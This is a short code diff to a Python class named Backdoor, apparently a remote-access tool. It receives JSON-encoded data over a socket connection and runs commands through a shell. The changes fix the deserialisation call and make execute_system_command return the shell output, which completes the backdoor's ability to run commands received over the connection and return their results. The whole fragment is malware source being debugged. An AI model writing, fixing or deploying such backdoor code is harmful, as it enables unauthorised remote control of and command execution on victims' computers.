@@ -20,13 +20,13 @@ class Backdoor:
         while True:
             try:
                 json_data = json_data + self.connection.recv(1024)
-                return json.load(json_data)
+                return json.loads(json_data)
             except ValueError:
                 continue
 
     def execute_system_command(self, command):
         try:
-            subprocess.check_output(command, shell=True)
+            return subprocess.check_output(command, shell=True)
         except subprocess.CalledProcessError:
             return "[-] Error during command execution"
 
